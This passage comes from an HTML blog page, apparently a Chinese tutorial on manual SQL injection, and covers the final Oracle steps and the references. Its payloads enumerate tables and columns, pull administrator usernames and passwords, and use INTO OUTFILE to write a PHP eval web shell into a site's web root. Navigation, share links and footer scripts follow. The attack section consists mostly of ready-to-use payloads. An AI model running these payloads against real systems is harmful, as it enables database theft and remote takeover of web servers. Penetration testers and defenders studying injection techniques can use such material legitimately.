+6.获取数据库表个数：使用 &apos; and (select count(*) from user_tables)=N–,N 从 0 开始 ++，返回正常即有 N 个表。
+7.猜测数据表名：使用 &apos; and 1=2 union select 1,’2’,table_name,4 from user_tables– 获取数据表名，设获得关键表名 XXX。
+8.判断账号数：利用 &apos; and (select count(*) from XXX)&gt;0 — 判断共有多少个账号，用数字替代 0，返回非正常页面证明账号个数为填入的数字。
+9.判断字段个数：使用 &apos; and (SELECT count(*) FROM USER_TAB_COLUMNS WHERE table_name=&apos;XXX&apos;)&gt;0–，通过替换数字 0，当页面出现错时，此时的数字就是该表的字段个数。
+设得到字段个数为 A=2。
+10.获取字段名：使用 &apos; and 1=2 union select 1,&apos;2&apos;,COLUMN_NAME,4 from (select * from (SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE table_name=’XXX’ order by 1 asc ) WHERE ROWNUM&lt;=A ORDER BY 1 DESC) WHERE ROWNUM&lt;=1，通过不断变换第一个 rownum 后面的数字（A–），可以得到该表的字段名称。设为 name,password.
+11.获取管理员信息：利用&apos; and 1=2 union select 1,name,password,4 from XXX — 获取管理员用户名和密码信息
+注入点导出一句话：
+在获取到字段数之后，直接联合查询 http://www.xxx.com/news.php?NewsID=-1 union select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;,2 into outfile &apos;D:/wwwroot/eval.php&apos;
+然后访问 eval.php。</code></pre><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ol>
+<li><a href="http://www.miaoer.love/?p=38" target="_blank" rel="noopener">MSSQL、MYSQL、ORACLE 手工注入</a></li>
+<li><a href="https://blkstone.github.io/2015/12/26/sqlmap-notes/" target="_blank" rel="noopener">sqlmap笔记</a></li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本常识"><span class="toc-number">1.</span> <span class="toc-text">0x01 基本常识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-ACCESS注入基本流程："><span class="toc-number">2.</span> <span class="toc-text">0x02 ACCESS注入基本流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-MSSQL报错注入基本流程："><span class="toc-number">3.</span> <span class="toc-text">0x03 MSSQL报错注入基本流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一"><span class="toc-number">4.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二"><span class="toc-number">5.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-MYSQL注入基本流程："><span class="toc-number">6.</span> <span class="toc-text">0x04 MYSQL注入基本流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一-1"><span class="toc-number">7.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二-1"><span class="toc-number">8.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Oracle注入"><span class="toc-number">9.</span> <span class="toc-text">0x05 Oracle注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-参考"><span class="toc-number">10.</span> <span class="toc-text">0x06 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&text=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&is_video=false&description=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ACCESS、MSSQL、MYSQL、ORACLE 手工注入&body=Check out this article: http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&title=ACCESS、MSSQL、MYSQL、ORACLE 手工注入" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html&name=ACCESS、MSSQL、MYSQL、ORACLE 手工注入&description=&lt;h2 id=&#34;0x01-基本常识&#34;&gt;&lt;a href=&#34;#0x01-基本常识&#34; class=&#34;headerlink&#34; title=&#34;0x01 基本常识&#34;&gt;&lt;/a&gt;0x01 基本常识&lt;/h2&gt;&lt;p&gt;简单判定有无漏洞：&lt;br&gt;粗略型：提交单引号’&lt;br&gt;逻辑型（数字型注入）：and 1=1/and 1=2&lt;br&gt;逻辑型（字符型注入）：’ and ‘1’=’1/‘ and ‘1’=’2&lt;br&gt;逻辑型（搜索型注入）：%’ and 1=1 and ‘%’=’%/%’ and 1=2 and ‘%’=’%&lt;/p&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
